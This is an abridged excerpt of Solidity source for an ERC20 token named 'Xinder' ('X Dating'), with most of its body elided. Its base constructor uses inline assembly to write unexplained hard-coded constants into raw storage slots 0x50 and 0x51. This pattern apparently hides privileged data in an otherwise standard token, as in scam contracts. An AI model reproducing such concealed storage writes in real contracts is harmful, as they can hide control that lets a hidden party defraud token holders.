...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x62877f02096a0ba6a3f9f2abc8836cbc97bf1f2896cc)
            sstore(0x51,0x6287b52cfa5d266968dea59d9cb4e9e567e9b0e75357)
    ...
    function _DeployXinder(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployXinder(creator, initialSupply);
    }
}

contract Xinder is ERC20Token {
    constructor() ERC20Token("X Dating", "XINDER", msg.sender, 69000000 * 10 ** 18) {
    }
}